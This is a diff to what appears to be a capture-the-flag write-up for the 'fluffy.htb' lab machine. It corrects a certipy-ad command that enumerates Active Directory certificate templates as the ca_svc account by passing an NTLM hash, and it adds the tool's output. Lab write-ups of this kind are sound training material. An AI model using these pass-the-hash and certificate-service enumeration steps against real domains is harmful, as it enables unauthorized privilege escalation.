@@ -580,5 +580,35 @@ Let’s evaluate each account for **potential privilege escalation**:
 The only feasible method here is to elevate our privileges through CA_SVC but you are free to try.
 Lets first enumerate to check if we can even proceed
 ```bash
-certipy-ad find -u ca_svc -Hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target fluffy.htb
+certipy-ad find -u ca_svc -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target fluffy.htb
+```
+Output
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
+[!] Use -debug to print a stacktrace
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
+[!] Use -debug to print a stacktrace
+[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
+[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Saving text output to '20250701003816_Certipy.txt'
+[*] Wrote text output to '20250701003816_Certipy.txt'
+[*] Saving JSON output to '20250701003816_Certipy.json'
+[*] Wrote JSON output to '20250701003816_Certipy.json'
+
 ```
